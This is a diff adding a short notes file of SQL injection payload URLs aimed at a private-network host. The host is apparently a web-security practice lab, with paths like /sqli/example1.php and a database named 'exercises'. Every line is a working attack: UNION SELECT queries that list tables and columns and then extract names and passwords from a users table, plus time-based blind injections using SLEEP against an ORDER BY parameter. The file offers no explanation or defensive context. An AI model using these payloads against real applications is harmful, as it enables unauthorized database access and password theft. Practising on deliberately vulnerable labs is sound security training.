@@ -1,0 +1,12 @@
+http://192.168.122.56/sqli/example1.php?name=root' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema='exercises' %23
+
+
+http://192.168.122.56/sqli/example1.php?name=root' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_schema='exercises' AND table_name='users' %23
+
+http://192.168.122.56/sqli/example1.php?name=root' UNION SELECT id,name,passwd,4,5 FROM users WHERE name='root' %23
+
+http://192.168.122.56/sqli/example1.php?name=root' UNION SELECT id,name,passwd,4,5 FROM users WHERE name='root' %23
+
+http://192.168.122.56/sqli/example8.php?order=name` OR IF(LENGTH(database()) = 1, SLEEP(1), NULL) %23
+
+http://192.168.122.56/sqli/example8.php?order=name` OR IF(ASCII(SUBSTRING(database(),1,1)) > 32, SLEEP(1), NULL) %23
